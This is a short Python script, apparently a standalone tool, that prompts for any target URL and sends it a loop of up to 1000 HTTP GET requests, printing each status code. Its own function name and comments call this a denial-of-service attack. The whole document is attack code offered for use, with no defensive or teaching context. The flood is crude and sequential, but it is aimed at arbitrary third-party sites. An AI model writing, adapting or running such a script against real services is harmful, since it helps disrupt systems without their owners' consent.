import requests
import time

def dos_attack(url, num_requests=1000):
    print(f"Starting DoS attack on {url}")
    
    for i in range(num_requests):
        try:
            response = requests.get(url)
            print(f"Request {i+1}: {response.status_code}")
        except Exception as e:
            print(f"Error on request {i+1}: {e}")
        time.sleep(0.1)  # Adding delay between requests to avoid crashing too fast

if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    
    # Simulate the attack
    dos_attack(target_url)
